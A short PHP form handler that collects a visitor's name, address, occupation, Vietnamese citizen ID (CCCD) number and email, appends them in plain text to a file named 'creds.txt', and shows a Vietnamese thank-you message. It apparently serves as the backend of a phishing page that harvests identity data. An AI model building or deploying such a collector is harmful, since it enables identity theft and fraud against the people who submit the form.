<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST['name'] ?? 'N/A';
    $address = $_POST['address'] ?? 'N/A';
    $job = $_POST['job'] ?? 'N/A';
    $cccd = $_POST['cccd'] ?? 'N/A';
    $email = $_POST['email'] ?? 'N/A';

    $log = "INFO | Họ tên: $name | Địa chỉ: $address | Nghề nghiệp: $job | CCCD: $cccd | Email: $email\n";
    file_put_contents("creds.txt", $log, FILE_APPEND);
    
    echo "<h3>Cảm ơn bạn đã cung cấp thông tin.</h3>";
}
?>
